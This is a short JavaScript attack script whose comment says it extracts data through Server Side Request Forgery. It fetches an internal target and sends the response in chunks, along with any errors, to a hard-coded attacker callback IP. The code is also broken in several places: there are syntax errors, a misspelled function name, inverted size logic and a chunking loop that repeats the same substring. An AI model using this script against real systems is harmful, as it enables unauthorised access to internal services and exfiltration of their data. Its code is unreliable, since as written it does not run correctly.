/*
  Authored by:
  James Krolik

  The purpose of this function is for Server Side Request Forgery (SSRF) data extraction.
  The main idea behind it is that large responses can get truncated when being sent back, so this
  will split the response up into smaller "chunks" and send them home.

  The expected response will contain the chunk number, in case they arrive out of order, and the relevant data.
  
  Example:
  GET /callback?chunk=7&data=%22plugins%22%3...
*/

function exfiltrate() {
    const CHUNKSIZE = 1024;              //Set the size of your chunks
    homeIP = "192.168.45.176";           //Your callback IP
    fetch("http://172.16.16.2:8001")     //Your SSRF target
    .then((response) => response.text())
    .then((data) => {
        length = data.length;
         if (length > CHUNKSIZE {    //If the length of the response is greater than the chunk size, just send it.
                fetch("http://" + homeIP + ":81/callback?" + encodeURIComponent(data));
        }
        else {
                totalChunks = Math.floor(data.length / 1024);  //with it being zero based, round down.
                size = length;
                chunks = [];    //Define an empty array to hold the pieces.

                while (size > CHUNKSIZE) {
                        let chunk = data.substring(1,1024);
                        chunks.push(chunk);
                        size = size - CHUNKSIZE;
                }
                for let i = 0; i < totalChunks; i++) {
                        fetch("http://" + homeIP + ":81/?chunk=" + i + "&data=" + encodeURIComponents(chunks[i]));
                }
    }).catch(err => {
        fetch("http://" + homeIP + ":81/error?" + encodeURIComponent(err));
    }); 
}
